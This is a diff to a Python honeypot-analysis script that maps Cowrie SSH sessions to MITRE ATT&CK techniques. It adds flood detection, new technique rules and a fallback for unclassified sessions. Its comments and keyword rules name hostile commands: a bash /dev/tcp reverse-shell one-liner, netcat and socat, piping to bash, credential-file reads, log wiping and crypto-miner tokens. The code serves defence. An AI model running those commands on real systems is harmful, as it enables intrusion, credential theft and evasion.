@@ -125,7 +125,42 @@ print(f"[+] Brute-force correlation: {len(brute_force_ips)} source IP(s), "
       f">= {BRUTE_FORCE_MIN_DISTINCT_USERNAMES} distinct usernames, content-based)")
 
 # -----------------------------------------------------------------------
+# Step 1.6: Connection-flood detection (T1499 — Endpoint DoS)
+# -----------------------------------------------------------------------
+# attack1.sh Phase 10 never opens an authenticated SSH session at all — it's
+# a raw `echo > /dev/tcp/host/port` connect/disconnect burst straight at
+# Cowrie's listener. That means these sessions have ZERO login attempts and
+# ZERO commands (they never get far enough for either), which is otherwise
+# impossible for a session that matched any of the content-based rules
+# below. A source IP that racks up a lot of these empty connect-only
+# sessions is the T1499 signature — content-based again, no timing needed.
+DOS_FLOOD_THRESHOLD = 15  # empty (no-login, no-command) sessions from one IP
+
+empty_sessions_by_ip = defaultdict(list)
+for sid, s in sessions.items():
+    if s["src_ip"] and s["login_attempts"] == 0 and not s["commands"]:
+        empty_sessions_by_ip[s["src_ip"]].append(sid)
+
+dos_flood_sessions = set()
+dos_flood_ips = set()
+for ip, sids in empty_sessions_by_ip.items():
+    if len(sids) >= DOS_FLOOD_THRESHOLD:
+        dos_flood_ips.add(ip)
+        dos_flood_sessions.update(sids)
+
+if dos_flood_sessions:
+    print(f"[+] Connection-flood correlation: {len(dos_flood_ips)} source IP(s), "
+          f"{len(dos_flood_sessions)} session(s) flagged as T1499 "
+          f"(>= {DOS_FLOOD_THRESHOLD} empty connect/disconnect sessions, content-based)")
+
+# -----------------------------------------------------------------------
 # Step 2: MITRE ATT&CK technique classification
+#
+# Extended to cover every phase attack1.sh actually runs (11 phases + the
+# T1078/T1005/T1041 additions) — the previous version only recognized 5 of
+# the ~14 techniques the attack script generates, so most of a run's real
+# technique diversity was being silently dropped before it ever reached
+# ttp_records.json (and therefore before it ever reached the LSTM).
 # -----------------------------------------------------------------------
 TECHNIQUE_RULES = {
     "T1110": {
@@ -136,8 +171,15 @@ TECHNIQUE_RULES = {
     "T1105": {
         "name": "Ingress Tool Transfer",
         "tactic": "Command and Control",
+        # wget is download-only, always counts. curl only counts here when
+        # it's NOT an outbound POST/upload (that's T1041's signature, Phase
+        # 13's exfil also uses curl and would otherwise double-tag as a
+        # "tool transfer" when it's actually exfiltration going the other
+        # direction).
         "rule": lambda s: any(
-            c.strip().startswith(("wget", "curl")) for c in s["commands"]
+            c.strip().startswith("wget")
+            or (c.strip().startswith("curl") and "-X POST" not in c and "-F " not in c and "--data" not in c)
+            for c in s["commands"]
         ),
     },
     "T1204": {
@@ -171,6 +213,118 @@ TECHNIQUE_RULES = {
             for c in s["commands"]
         ),
     },
+    # ---- Newly recognized (attack1.sh already generates these) ----------
+    "T1049": {
+        "name": "System Network Connections Discovery",
+        "tactic": "Discovery",
+        "rule": lambda s: any(
+            c.strip().startswith(("netstat", "ss -an", "ss -a")) for c in s["commands"]
+        ),
+    },
+    "T1057": {
+        "name": "Process Discovery",
+        "tactic": "Discovery",
+        "rule": lambda s: any(
+            c.strip().startswith("ps aux") or c.strip() == "ps" for c in s["commands"]
+        ),
+    },
+    "T1046": {
+        "name": "Network Service Scanning",
+        "tactic": "Discovery",
+        # "/dev/tcp/" alone isn't unique to port-sweeping — a reverse shell
+        # (`bash -i >& /dev/tcp/host/port 0>&1`) uses the exact same bash
+        # builtin for a different purpose and was colliding with this rule
+        # until testing caught it. Exclude the reverse-shell fingerprint
+        # (0>&1 stdin redirect, or "bash -i") explicitly.
+        "rule": lambda s: any(
+            (c.strip().startswith("nmap") or "/dev/tcp/" in c)
+            and "0>&1" not in c and "bash -i" not in c
+            for c in s["commands"]
+        ),
+    },
+    "T1548": {
+        "name": "Abuse Elevation Control Mechanism",
+        "tactic": "Privilege Escalation",
+        "rule": lambda s: any(
+            c.strip().startswith("sudo -l") or "-perm -4000" in c
+            or c.strip().startswith("cat /etc/sudoers")
+            for c in s["commands"]
+        ),
+    },
+    "T1552": {
+        "name": "Unsecured Credentials",
+        "tactic": "Credential Access",
+        "rule": lambda s: any(
+            "id_rsa" in c or ".pem" in c or "credentials" in c.lower()
+            or ("grep" in c and "password" in c.lower())
+            for c in s["commands"]
+        ),
+    },
+    "T1021": {
+        "name": "Remote Services",
+        "tactic": "Lateral Movement",
+        "rule": lambda s: any(
+            c.strip().startswith("ssh ") and "ConnectTimeout" in c for c in s["commands"]
+        ),
+    },
+    "T1070": {
+        "name": "Indicator Removal",
+        "tactic": "Defense Evasion",
+        "rule": lambda s: any(
+            c.strip().startswith("history -c") or "bash_history" in c
+            or c.strip().startswith("unset HISTFILE") or "rm -f /var/log" in c
+            for c in s["commands"]
+        ),
+    },
+    "T1489": {
+        "name": "Service Stop",
+        "tactic": "Impact",
+        "rule": lambda s: any(
+            (c.strip().startswith(("systemctl stop", "service ")) and ("auditd" in c or "rsyslog" in c))
+            or c.strip().startswith("iptables -F") or "pkill -f auditd" in c
+            for c in s["commands"]
+        ),
+    },
+    # ---- New attack vectors (Phase 12/13 additions to attack1.sh) -------
+    "T1005": {
+        "name": "Data from Local System",
+        "tactic": "Collection",
+        "rule": lambda s: any(c.strip().startswith("tar c") for c in s["commands"]),
+    },
+    "T1041": {
+        "name": "Exfiltration Over C2 Channel",
+        "tactic": "Exfiltration",
+        "rule": lambda s: any(
+            c.strip().startswith("curl") and ("-X POST" in c or "-F " in c or "--data" in c)
+            for c in s["commands"]
+        ),
+    },
+    # ---- Realistic persistence/impact patterns (real-world attacker TTPs
+    # that cybersentinel_skeleton.py's TECHNIQUE_REGISTRY already covers for
+    # CVE/config lookups, but ttp_extract.py never matched) --------------
+    "T1053": {
+        "name": "Scheduled Task/Job",
+        "tactic": "Persistence",
+        "rule": lambda s: any(
+            "crontab" in c or c.strip().startswith(("echo * * * * *", "(crontab"))
+            for c in s["commands"]
+        ),
+    },
+    "T1098": {
+        "name": "Account Manipulation",
+        "tactic": "Persistence",
+        "rule": lambda s: any(
+            "authorized_keys" in c for c in s["commands"]
+        ),
+    },
+    "T1496": {
+        "name": "Resource Hijacking",
+        "tactic": "Impact",
+        "rule": lambda s: any(
+            any(tok in c.lower() for tok in ("xmrig", "minerd", "stratum+tcp", "cryptonight", "nicehash"))
+            for c in s["commands"]
+        ),
+    },
 }
 
 # -----------------------------------------------------------------------
@@ -193,6 +347,72 @@ for session_id, s in sessions.items():
             "name": TECHNIQUE_RULES["T1110"]["name"],
             "tactic": TECHNIQUE_RULES["T1110"]["tactic"],
         })
+    # T1499: connection-flood correlation (see Step 1.6) — content-based,
+    # can't be expressed as a per-command rule since these sessions have no
+    # commands at all.
+    if session_id in dos_flood_sessions:
+        techniques.append({
+            "id": "T1499",
+            "name": "Endpoint Denial of Service",
+            "tactic": "Impact",
+        })
+    # T1078: Valid Accounts — attack1.sh Phase 12 re-authenticates with a
+    # credential pair already confirmed to work in Phase 2, then runs a
+    # check-in command tagged with a distinct marker string so this rule
+    # can't collide with Phase 1's recon sessions (which also do a single
+    # clean login + multiple commands, but never emit this marker).
+    is_clean_reentry = any(
+        "cs_valid_account_reentry" in c for c in s["commands"]
+    )
+    if is_clean_reentry:
+        techniques.append({
+            "id": "T1078",
+            "name": "Valid Accounts",
+            "tactic": "Persistence",
+        })
+
+    # -------------------------------------------------------------------
+    # UNCLASSIFIED fallback — "zero-day" / unknown-technique handling.
+    #
+    # Every rule above is a signature match against a KNOWN, hand-written
+    # command pattern. A session that does something genuinely new — a
+    # different tool, an obfuscated/base64 command, a technique nobody
+    # wrote a rule for — matches none of them. The old behaviour: such a
+    # session was silently dropped (the `if techniques:` guard below never
+    # ran), so it never reached ttp_records.json, the LSTM, or any report,
+    # even though Cowrie recorded every command it ran.
+    #
+    # Fix: a session with real activity (more than a bare "exit" probe)
+    # that matched NOTHING above is flagged UNCLASSIFIED instead of
+    # discarded, with a lightweight, rule-independent suspicion score so
+    # an analyst (or a future anomaly model) has something to go on even
+    # without a signature. This is intentionally NOT another keyword rule
+    # for a specific technique — it's a catch-all for "this doesn't look
+    # like anything we know, but it isn't nothing either."
+    # -------------------------------------------------------------------
+    real_commands = [c for c in s["commands"] if c.strip() and c.strip() != "exit"]
+    if not techniques and real_commands:
+        reasons = []
+        joined = " ".join(real_commands).lower()
+
+        if "base64" in joined or " -d " in joined or "| bash" in joined or "|bash" in joined:
+            reasons.append("possible obfuscated/encoded command execution")
+        if any(tok in joined for tok in ("perl ", "ruby ", "php ", "nc ", "ncat ", "socat ", "python3 -c", "python -c")):
+            reasons.append("uncommon interpreter/tool not in the known-technique list")
+        if any(len(c) > 200 for c in real_commands):
+            reasons.append("unusually long command (possible payload smuggling)")
+        if any(c.count(";") + c.count("|") + c.count("&&") >= 4 for c in real_commands):
+            reasons.append("heavily chained/piped command sequence")
+        if not reasons:
+            reasons.append("ran real commands but matched no known MITRE technique signature")
+
+        techniques.append({
+            "id": "UNCLASSIFIED",
+            "name": "Unknown Technique (unmatched by any registry rule)",
+            "tactic": "Unknown",
+            "suspicion_reasons": reasons,
+        })
+
     if techniques:
         ttp_records.append({
             "session_id": session_id,
@@ -221,10 +441,13 @@ print(f"Sessions matching at least one technique:  {len(ttp_records)}")
 
 technique_counts = defaultdict(int)
 tactic_counts = defaultdict(int)
+unclassified_records = []
 for r in ttp_records:
     for t in r["techniques"]:
         technique_counts[f"{t['id']} -- {t['name']}"] += 1
         tactic_counts[t["tactic"]] += 1
+        if t["id"] == "UNCLASSIFIED":
+            unclassified_records.append(r)
 
 print("\nTechnique frequency (MITRE ATT&CK):")
 if technique_counts:
@@ -232,6 +455,20 @@ if technique_counts:
         print(f"  {name}: {count} sessions")
 else:
     print("  None matched — see debug steps below")
+
+if unclassified_records:
+    print(f"\n[!] {len(unclassified_records)} session(s) flagged UNCLASSIFIED — "
+          f"real activity that matched no known technique signature:")
+    for r in unclassified_records[:10]:
+        reasons = r["techniques"][-1].get("suspicion_reasons", [])
+        cmds_preview = " | ".join(c.strip() for c in r["raw_commands"] if c.strip())[:80]
+        print(f"    session {r['session_id']} from {r['source_ip']}: {reasons}")
+        print(f"      commands: {cmds_preview}{'...' if len(cmds_preview) == 80 else ''}")
+    if len(unclassified_records) > 10:
+        print(f"    ... and {len(unclassified_records) - 10} more (see ttp_records.json, id=UNCLASSIFIED)")
+    print("    Review these manually — they're the sessions ttp_extract.py")
+    print("    couldn't explain, which is exactly what a rule-based system")
+    print("    can't do anything about on its own.")
 
 print("\nTactic distribution:")
 for tactic, count in sorted(tactic_counts.items(), key=lambda x: -x[1]):
